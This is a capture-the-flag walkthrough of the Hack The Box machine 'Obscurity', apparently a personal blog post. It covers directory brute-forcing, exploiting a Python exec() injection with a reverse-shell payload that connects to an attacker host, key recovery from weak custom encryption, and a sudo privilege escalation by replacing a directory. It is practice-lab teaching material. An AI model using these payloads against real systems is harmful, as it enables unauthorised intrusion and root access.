---
layout: post
title:  "HTB: Obscurity Walkthrough"
categories: writeups HTB
permalink: /:categories/:title
---


![Obscurity Logo](../../assets/img/writeups/htb/obscurity/about_box.png)

Date: 5/9/2020   
Author: n0tAc0p  

Table of Contents
1. TOC 
{:toc} 

### TL;DR

`Public server code --> Weak Encryption (by design) --> Directory moving --> root`

### Recon and Enumeration

As always, we started with a masscan. It found ports 22 and 8080. We ran nmap to find out more information.

![NMAP Scan](../../assets/img/writeups/htb/obscurity/detailed_port_scan.png)

NMAP had a hard time fingerprinting what was running on 8080, but it looked to be a custom web server which calls itself "BadHTTPServer"

So we have:

22: SSH  
8080: A custom web server 

Navigating to http://10.10.10.168:8080, we found a website called `0bsucra`. Essentially, the parties behind the site created a custom web server, encryption system, and SSH program. I had a feeling these would come into play throughout the box.

{:refdef: style="text-align: center;"}
![Obscura Software](../../assets/img/writeups/htb/obscurity/obscura_software.png)
{: refdef}

The bottom of the website had an intersting message to the devs.... I love me some guessing

{:refdef: style="text-align: center;"}
![Obscura Dev Message](../../assets/img/writeups/htb/obscurity/obscura_devs.png)
{: refdef}

#### Directory Enumeration

I tried every word I could think of based on word play from the site as the "secret development directory". And... I could not find it.

Then I tried gobuster. But it ran into issues since it sends `HEAD` requests (and not `GET` requests). The custom server responds correctly according to HTTP protocol when you send it a GET request, but not with a HEAD. Not a big problem, we can use dirb or dirbuster. I used dirbuster with the `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` wordlist. About 75% through with no matches, I realized that was not going to get me anywhere.

After some source code enumeration I found there existed multiple javascript files, one being /js/custom.js. Navgiating to it in the browser brought up the file fine (its contents are irrelevant). But when I tried to navigate to 10.10.10.168:8080/js/ it told me file not found. I failed to realize that the custom web server most likely did not have any form of directory listing. Thus, the only way to find the webserver code was by navigating to its full path, 10.10.10.168/?/SuperSecureServer.py. Now we could resume the search for the mystery directory.

Instead of continuing to guess and make myself sad, I wrote a simple python script that checks for the file. There are probably easier ways to do this, but this was more fun.

~~~python
import sys
from requests import get

if len(sys.argv) < 3:
	print("Error!\nUsage: python slow-smart-bf.py <host> <wordlist_path>")
	exit(0)

host = sys.argv[1]
wordlist = sys.argv[2]

with open(wordlist, "r") as f:
	while f:
		directory = f.readline().strip().replace("'", "")
		print("Trying: {}/{}/SuperSecureServer.py".format(host, directory))
		response = get("{}/{}/SuperSecureServer.py".format(host, directory))
		if response.status_code != 404:
			print("Found something at: {}/SuperSecureServer.py".format(directory))
			break
print("Terminating...")
~~~

Using `/usr/share/wordlists/dirb/common.txt` as the wordlist, we found the secret file in the /develop directory. I cannot explain the short lived rage I felt once I saw this, and realized I never thought of checking it.

### Initial Foothold

SuperSecureServer.py turns out to be not no secure. It uses an exec() statement with lightly sanitized user input. Which meant possible Remote Code Execution for us.


Point of RCE
{:refdef: style="text-align: center;"}
![Potential RCE in Code](../../assets/img/writeups/htb/obscurity/rce_code_1.png)
{: refdef}

Now where is the source? That is, where is the point of user input?
{:refdef: style="text-align: center;"}
![Source of user data](../../assets/img/writeups/htb/obscurity/source.png)
{:refdef}

We noticed 2 things as we went through the source code:
1. The parameter we inject is `request.doc` (the URI after 8080/?)
2. The only sanitation done on our payload is a URL Decode with `urllib.parse.unquote()`

#### Reverse Shell Via Exec()

To the exec() statement, our payload looks like this:

`"output = 'Document: <USER INPUT>'"`

So we need to escape from the initial string assignment, inject our payload, then clean up the quotes.

**Note: The web server will not respond to a request if it contains a single quote ', so we used urllib.parse.quote to URL Encode our payload**

Here is the python script I wrote to execute the payload, since I did not feel like using Burp or the browser:

~~~python
import sys
import urllib.parse
from requests import get

if len(sys.argv) < 3:
    print("Error!\nUsage: python exploit.py <host> <port>")
    exit(0)

host = sys.argv[1]
port = int(sys.argv[2])

payload = """';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{}',{}));
				os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);'""".format(host,port) 
safePayload = urllib.parse.quote(payload)
response = get("http://10.10.10.168:8080/{}".format(safePayload))
if (response.status_code == 404):
    print("Successful Injection")
else:
    print("Injection NOT successful")
~~~

If we set up a listener on netcat, we get a reverse shell back as `www-data`

{:refdef: style="text-align: center;"}
![WWW-Data user](../../assets/img/writeups/htb/obscurity/www_data_user.png)
{: refdef}

Onto user...

### Getting User 

I ran linPEAS.sh for some basic enumeration. But in all honesty, it was not needed. If we navigate to /home/robert, we can see all the custom files and services the site spoke about. As *www-data* we could read:

1. SuperSecureCrypt.py
2. A plaintext file
3. An encrypted version of #2 created using #1
4. An encrypted password file
5. BetterSSH.py

So to read the password file, we need to use SuperSecureCrypt with the decryption key (which we did **NOT** have).

But what we had instead was almost just as good. We knew the system of encryption, and had an unencrypted/encrypted file, corresponding to the same plaintext. The only unknown was the key!!

Shown below is the encryption function for completeness

{:refdef: style="text-align: center;"}
![SuperSecureCrypt.py Encrypt Function](../../assets/img/writeups/htb/obscurity/encrypt_function.png)
{: refdef}

#### Encryption Boogaloo

The most important line in the encryption function is where the encrypted output is built, character by character. That is:

~~~python
newChr = chr((newChr +ord(keyChr)) % 255)
~~~

Getting more abstract:

~~~ python
encryptedChar[i] = chr((ord(plaintextChar[i]) + ord(key[i])) % 255)

More abstractly (forgetting about characters for now):

encrypted = plaintext + key

Solving for the key:

key = encrypted - plaintext.
~~~

If we head back into character land, the script to get the entire key is below:

~~~python
def blindDecrypt(input, output):
	key = ""
	for i in range(len(input)):
	    plaintextChar = ord(input[i])
	    ciphertextChar = ord(output[i])
	    keyChar = chr((ciphertextChar - plaintextChar) % 255)
	    key += keyChar
	return key
~~~

Some things to note:
1. ord(\<char\>) generates the ascii value (0-255) of the character in question
2. char(int) generates a character given its ascii value
3. the given input and output file did not exactly match in length 
4. python3 is the only version of python we can use on this box

**Note: Non-Matching lengths would be an issue if the key did not repeat**

If we run this program with the plaintet and ciphertext we are given, we get:

`alexandrovichalexandrovichalexandrovichalexandroévc\¢ma2©Æk=$~ª[XzºqWkÁy®dglk|_nmº`

We can clearly tell then, that the key used is `alexandrovich`.

So if we run this key and the passordReminder.txt file through SuperSecureCrypt.py with: 

`python3 SuperSecureCrypt.py -d -k alexandrovich -i out.txt -o pass.txt`   

We get the password to be: `SecThruObsFTW`.

With that password in tow, we can either use su robert or ssh with the found password. And we are now user robert!

![User Robert Shell](../../assets/img/writeups/htb/obscurity/robert_shell.png)

### Privilege Escalation

I re-ran linPEAS, and discovered that robert could run sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py without a password. Of course, I could have determined this by running `sudo -l` and not messing with linPEAS again. Still, it was nice information. 

![LinPEAS... AGAIN](../../assets/img/writeups/htb/obscurity/linpeas_1.png)

The only issue was, robert did not have write permission on BetterSSH.py :(. I contemplated using symlinks, which did not pan out (I misundrstood what symlinks were). Instead I turned to some basic linux file commands.

#### Permission "Exploitation"

Checking file permissions of /home/robert, we saw, as expected, that robert can read, write, and execute in his home directory. This lead me to learn much more about directory permissions. I summarized them below, but more information can be found in the `Resources` section of this walkthrough.

{:refdef: style="text-align: center;"}
![Robert Home Directory Permissions](../../assets/img/writeups/htb/obscurity/robert_home_permissions.png)
{: refdef}

For directories:

r = ability to list files in the directory (calling ls)  
w = ability to create, rename, and delete files  
x = ability to access the directory (ie. cd into it)  

For files:

r = ability to read file  
w = ability to write to and edit file  
x = ability to execute file as a program  

This is all well and good, but it gets very interesting when you are moving things in directories. Unless you are moving directories across file systems, you need 4 things:

1. Write permission on source directory
2. Execute permissions on source directory
3. Write permission on target directory
4. Execute permission on target directory

You may be saying, **"Wait! If we are moving a directory, we are moving files. so we must need read permissions on them!!"**. Actually, you don't! With execute and write permissions in the parent directory, we can move files even if we have 0 permission for them. As we are just changing the name the system uses to access the file, no reading or writing of the file actually happens. (**Note: moving files to a different file system requires different permissions**)

With that in mind, we are able to rename the BetterSSH directory, and create a new directory named BetterSSH. Inside, we add a file called BetterSSH.py, with a simple payload

~~~python
import os
os.system("/bin/bash")
~~~

Since the path of this script is still /home/robert/BetterSSH/BetterSSH.py, we can execute it with sudo and get root access!!

![Directory Exploit to root](../../assets/img/writeups/htb/obscurity/directory_exploit.png)

There may be other ways to achieve the same results, but this method was pretty painless. It also forced me to learn more about file permissions.

### Conclusion

While I usually list ways to fix vulnerabilities on a box, I will skip that section on this box. It felt more like a huge CTF challenge to me. That is not to say the box was not challenging and a boatload of fun. The box got my creative juices flowing, and allowed me to sharpen my python skills (among many other things). Shout out to `clubby879` for creating the box and thank you for reading! Onto the next on...

As always, I appreciate feedback and questions if you have them. Feel free to reply to the thread you found the link to this page on, or DM me on the forums.

### References

1. Linux File Permissions (UNIX Stack Exchange): https://unix.stackexchange.com/questions/21251/execute-vs-read-bit-how-do-directory-permissions-in-linux-work
2. Linux File Permissions (Hacking Linux Exposed): https://www.hackinglinuxexposed.com/articles/20030424.html
3. Linux File Permissions (Great Analogy, UNIX Stack Exchange): https://unix.stackexchange.com/questions/231939/understanding-permissions-properly-for-cp